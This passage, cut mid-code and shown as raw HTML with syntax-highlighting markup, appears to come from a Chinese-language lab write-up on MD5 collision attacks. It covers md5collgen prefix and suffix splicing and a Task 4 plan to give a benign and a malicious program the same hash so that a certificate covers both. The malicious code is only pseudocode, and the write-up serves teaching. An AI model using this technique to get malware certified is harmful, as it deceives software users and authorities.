class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, xyz[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用bless查看demo.out文件，先找到数组位置，数组开始位置为0x3020，从而得到前缀结束位置：0x3040（由于0x3020不是64的倍数，需扩展到64的倍数），对应10进制数为12352。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032651.png"alt="image-20230927200915995" /><figcaption aria-hidden="true">image-20230927200915995</figcaption></figure></li><li><p>截取前缀部分，作为demo_prefix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032652.png"alt="image-20230927201000671" /><figcaption aria-hidden="true">image-20230927201000671</figcaption></figure></li><li><p>根据该前缀生成两个具有相同 MD5哈希值的文件(每个生成文件的最后128位是P和Q)。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032653.png"alt="image-20230927201015560" /><figcaption aria-hidden="true">image-20230927201015560</figcaption></figure></li><li><p>截取后缀部分（前缀部分+128字节开始），作为demo_suffix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032654.png"alt="image-20230927201030131" /><figcaption aria-hidden="true">image-20230927201030131</figcaption></figure></li><li><p>使用第四步生成的文件分别和demo_suffix进行拼接，得到demo_out1s.bin和demo_out2s.bin。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032655.png"alt="image-20230927201047554" /><figcaption aria-hidden="true">image-20230927201047554</figcaption></figure></li><li><p>步骤1得到demo_out1s.bin和demo_out2s.bin的内容不同，步骤2得到它们的哈希值相同。通过bless中对两个文件分析，发现中间128字节内容仅个别字节不同，大部分相同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032656.png"alt="image-20230927201108023" /><figcaption aria-hidden="true">image-20230927201108023</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071003577.png"alt="image-20231207093835102" /><figcaption aria-hidden="true">image-20231207093835102</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312070938787.png"alt="image-20231207093853670" /><figcaption aria-hidden="true">image-20231207093853670</figcaption></figure></li></ol><h2 id="task-4-making-the-two-programs-behave-differently">2.4 Task 4:Making the Two Programs Behave Differently</h2><p>在前面的任务中，我们成功创建了两个 MD5哈希值相同但行为不同的程序。不过，它们的区别仅在于打印出的数据不同，执行的指令序列仍然相同。在这项任务中，我们希望实现一些更重要、更有意义的目标。</p><p>假设您创建了一个能做好事的软件。你把软件送到一个值得信赖的权威机构进行认证。权威机构会对你的软件进行全面测试，并得出结论：你的软件确实在做好事。权威机构会向你颁发证书，证明你的程序是好的。为防止您在获得证书后更改程序，证书中还包括程序的MD5哈希值；证书由权威机构签名，因此您不能更改证书或程序上的任何内容，否则签名无效。</p><p>您想让权威机构认证您的恶意软件，但如果您只是将恶意软件发送给权威机构，您就没有机会实现这一目标。不过，您注意到权威机构使用MD5生成哈希值。你有了一个想法。你计划编写两个不同的程序。一个程序会一直执行良性指令并做好事，而另一个程序则会执行恶意指令并造成破坏。你要想办法让这两个程序共享相同的MD5 哈希值。</p><p>然后，您将良性版本发送给权威机构进行认证。由于该版本做了好事，它将通过认证，你将获得包含良性程序哈希值的证书。由于你的恶意程序具有相同的哈希值，该证书对你的恶意程序也有效。因此，您已成功为恶意程序获取了有效证书。如果其他人相信权威机构颁发的证书，他们就会下载你的恶意程序。</p><p>本任务的目标是发起上述攻击。也就是说，你需要创建两个共享相同 MD5哈希值的程序。但是，一个程序将始终执行良性指令，而另一个程序将执行恶意指令。在您的工作中，执行什么良性/恶意指令并不重要；只要证明这两个程序执行的指令是不同的就足够了。</p><p>指导：创建两个完全不同的程序来产生相同的 MD5 哈希值是相当困难的。由md5collgen生成的两个哈希碰撞程序需要共享相同的前缀；此外，正如我们从前面的任务中看到的，如果我们需要在md5collgen生成的输出中添加一些有意义的后缀，那么添加到两个程序中的后缀也需要相同。这就是我们使用的MD5碰撞生成程序的局限性。虽然有其他更复杂、更先进的工具可以解除某些限制，例如接受两个不同的前缀，但它们需要更强的计算能力，因此不在本实验室的研究范围内。我们需要找到一种方法，在限制范围内生成两个不同的程序。</p><p>实现上述目标的方法有很多。我们提供了一种方法作为参考，但鼓励学生提出自己的想法。教师可以考虑奖励有自己想法的学生。在我们的方法中，我们创建了两个数组X 和 Y。我们比较这两个数组的内容；如果它们相同，则执行良性代码；否则，执行恶意代码。请参阅下面的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">Array X;<br>Array Y;<br>main()<br>&#123;<br><span class="hljs-keyword">if</span>(X’s contents and Y’s contents are the same)<br>run benign code;<br><span class="hljs-keyword">else</span><br>run malicious code;<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以用一些值来初始化数组 X 和Y，这些值可以帮助我们找到它们在可执行二进制文件中的位置。我们的任务是更改这两个数组的内容，从而生成具有相同MD5 哈希值的两个不同版本。在一个版本中，X 和 Y的内容相同，因此良性代码会被执行；在另一个版本中，X 和 Y的内容不同，因此恶意代码会被执行。我们可以使用与任务 3中类似的技术来实现这一目标。图 4 展示了两个版本的程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312070943670.png"alt="image-20231207094345602" /><figcaption aria-hidden="true">image-20231207094345602</figcaption></figure><p>从图 4 中我们可以知道，只要相应地生成 P 和Q，这两个二进制文件就具有相同的 MD5 哈希值。在第一个版本中，我们使数组 X和 Y的内容相同，而在第二个版本中，我们使它们的内容不同。因此，我们只需改变这两个数组的内容，而无需改变程序的逻辑。</p><p><strong>实验流程：</strong></p><ol type="1"><li>根据实验指导，编写task4.c程序，并进行编译<code>gcc -o task4.out task4.c</code>。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span 